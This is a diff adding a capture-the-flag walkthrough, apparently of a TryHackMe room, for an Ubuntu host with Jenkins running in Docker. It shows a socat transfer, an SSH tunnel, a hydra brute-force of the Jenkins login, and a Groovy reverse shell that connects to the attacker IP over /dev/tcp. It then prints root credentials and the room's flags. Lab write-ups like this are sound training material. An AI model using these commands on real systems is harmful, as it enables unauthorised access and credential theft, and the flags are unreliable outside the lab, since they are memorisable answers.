@@ -480,3 +480,244 @@ netstat -tan | grep 8080
 tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN 
 
 There are several indications that docker is available on the target, and as the Jenkins documentation (https://www.jenkins.io/doc/book/installing/) explains how to install Jenkins with docker, we can assume that this is how Jenkins has been installed. If not a rabbit hole, this could be a way to elevate our privileges to root. Worth trying…
+
+To make Jenkins available to us (instead of just localhost), we can use socat to redirect ports. As socat is not available on the target, we have to transfer it. Here is how you can do it: 
+
+on Kali:
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ which socat                                                            
+/usr/bin/socat
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ cd /usr/bin/
+```
+```text
+┌──(kali㉿kali)-[/usr/bin]
+└─$ python3 -m http.server                 
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+
+On the target:
+
+aubreanna@internal:~$ cd /tmp/
+cd /tmp/
+aubreanna@internal:/tmp$ wget http://10.11.81.220:8000/socat
+wget http://10.11.81.220:8000/socat
+--2022-09-28 16:32:50--  http://10.11.81.220:8000/socat
+Connecting to 10.11.81.220:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 411656 (402K) [application/octet-stream]
+Saving to: ‘socat’
+
+socat               100%[===================>] 402.01K   255KB/s    in 1.6s    
+
+2022-09-28 16:32:52 (255 KB/s) - ‘socat’ saved [411656/411656]
+
+aubreanna@internal:/tmp$ chmod +x socat
+chmod +x socat
+aubreanna@internal:/tmp$ ./socat TCP-LISTEN:8888,fork TCP:127.0.0.1:80 &
+./socat TCP-LISTEN:8888,fork TCP:127.0.0.1:80 &
+[1] 2229
+aubreanna@internal:/tmp$ ./socat: error while loading shared libraries: libssl.so.3: cannot open shared object file: No such file or directory
+
+[1]+  Exit 127                ./socat TCP-LISTEN:8888,fork TCP:127.0.0.1:80
+
+aubreanna@internal:/tmp$ ifconfig
+ifconfig
+docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
+        inet6 fe80::42:e7ff:fe6f:6570  prefixlen 64  scopeid 0x20<link>
+        ether 02:42:e7:6f:65:70  txqueuelen 0  (Ethernet)
+        RX packets 8  bytes 420 (420.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 18  bytes 1324 (1.3 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
+        inet 10.10.97.105  netmask 255.255.0.0  broadcast 10.10.255.255
+        inet6 fe80::c1:a5ff:fedc:480f  prefixlen 64  scopeid 0x20<link>
+        ether 02:c1:a5:dc:48:0f  txqueuelen 1000  (Ethernet)
+        RX packets 152173  bytes 18229104 (18.2 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 89869  bytes 32833666 (32.8 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 1802  bytes 170270 (170.2 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 1802  bytes 170270 (170.2 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+vethf6a9272: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet6 fe80::e806:79ff:fe7a:4c95  prefixlen 64  scopeid 0x20<link>
+        ether ea:06:79:7a:4c:95  txqueuelen 0  (Ethernet)
+        RX packets 8  bytes 532 (532.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 33  bytes 2470 (2.4 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+so much better a ssh tunnel
+```
+
+## Exploitation
+```text
+┌──(kali㉿kali)-[~]
+└─$ ssh -L 6767:172.17.0.2:8080 aubreanna@internal.thm
+The authenticity of host 'internal.thm (10.10.97.105)' can't be established.
+ED25519 key fingerprint is SHA256:seRYczfyDrkweytt6CJT/aBCJZMIcvlYYrTgoGxeHs4.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'internal.thm' (ED25519) to the list of known hosts.
+aubreanna@internal.thm's password: 
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed Sep 28 16:44:18 UTC 2022
+
+  System load:  0.0               Processes:              116
+  Usage of /:   63.8% of 8.79GB   Users logged in:        0
+  Memory usage: 35%               IP address for eth0:    10.10.97.105
+  Swap usage:   0%                IP address for docker0: 172.17.0.1
+
+  => There is 1 zombie process.
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+0 packages can be updated.
+0 updates are security updates.
+
+Last login: Mon Aug  3 19:56:19 2020 from 10.6.2.56
+
+now go to
+
+http://localhost:6767
+
+and can see jenkins login
+
+using burpsuite and hydra
+
+or inspecting page network
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 6767 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-28 12:52:08
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-post-form://localhost:6767/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password
+[6767][http-post-form] host: localhost   login: admin   password: spongebob
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-28 12:52:54
+
+:) found it   admin:spongebob
+
+login
+
+Reverse shell in docker
+
+Now that we have an admin access to Jenkins, we can run commands, and we’ll ultimately exploit this to have a reverse shell.
+
+Start by running a listener (on your machine): 
+
+Now we have Jenkins password. Use it login and click on “manage jenkins” and find “script console”.
+
+    Jenkins has lovely Groovy script console that permits anyone to run arbitrary Groovy scripts inside the Jenkins master runtime. Groovy is a very powerful language which offers the ability to do practically anything Java can do. 
+
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.11.81.220/5555;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+
+priv esc
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ rlwrap nc -nlvp 5555                                
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::5555
+Ncat: Listening on 0.0.0.0:5555
+Ncat: Connection from 10.10.97.105.
+Ncat: Connection from 10.10.97.105:45048.
+cd /opt
+ls -la
+total 12
+drwxr-xr-x 1 root root 4096 Aug  3  2020 .
+drwxr-xr-x 1 root root 4096 Aug  3  2020 ..
+-rw-r--r-- 1 root root  204 Aug  3  2020 note.txt
+cat note.txt
+Aubreanna,
+
+Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
+need access to the root user account.
+
+root:tr0ub13guM!@#123
+su root
+su: must be run from a terminal
+python3 -c "import pty;pty.spawn('/bin/bash')"
+/bin/bash: python3: command not found
+python -c "import pty;pty.spawn('/bin/bash')"
+  File "<string>", line 1
+    "import
+          ^
+SyntaxError: EOL while scanning string literal
+/bin/bash -i
+bash: cannot set terminal process group (6): Inappropriate ioctl for device
+bash: no job control in this shell
+jenkins@jenkins:/opt$ su root
+su root
+su: must be run from a terminal
+jenkins@jenkins:/opt$ python3 -c "import pty;pty.spawn('/bin/bash')"
+python3 -c "import pty;pty.spawn('/bin/bash')"
+bash: python3: command not found
+jenkins@jenkins:/opt$ python -c "import pty;pty.spawn('/bin/bash')"
+python -c "import pty;pty.spawn('/bin/bash')"
+jenkins@jenkins:/opt$ su root
+su root
+Password: tr0ub13guM!@#123
+
+su: Authentication failure
+
+i see cz is a container (docker) so in the other rev shell where is aubreanna
+
+aubreanna@internal:~$ su root
+Password: tr0ub13guM!@#123
+root@internal:/home/aubreanna# cd /root
+root@internal:~# ls -la
+total 48
+drwx------  7 root root 4096 Aug  3  2020 .
+drwxr-xr-x 24 root root 4096 Aug  3  2020 ..
+-rw-------  1 root root  193 Aug  3  2020 .bash_history
+-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
+drwx------  2 root root 4096 Aug  3  2020 .cache
+drwx------  3 root root 4096 Aug  3  2020 .gnupg
+drwxr-xr-x  3 root root 4096 Aug  3  2020 .local
+-rw-------  1 root root 1071 Aug  3  2020 .mysql_history
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+drwx------  2 root root 4096 Aug  3  2020 .ssh
+-rw-r--r--  1 root root   22 Aug  3  2020 root.txt
+drwxr-xr-x  3 root root 4096 Aug  3  2020 snap
+root@internal:~# cat root.txt
+THM{d0ck3r_d3str0y3r}
+```
+![[Pasted image 20220928112542.png]]
+![[Pasted image 20220928114706.png]]
+User.txt Flag
+Root.txt Flag
+
+## Flags / Answers
+- ***THM{int3rna1_fl4g_1}***
+- ***THM{d0ck3r_d3str0y3r}***
+
+## Notes / Lessons Learned
+[[Relevant]]
+
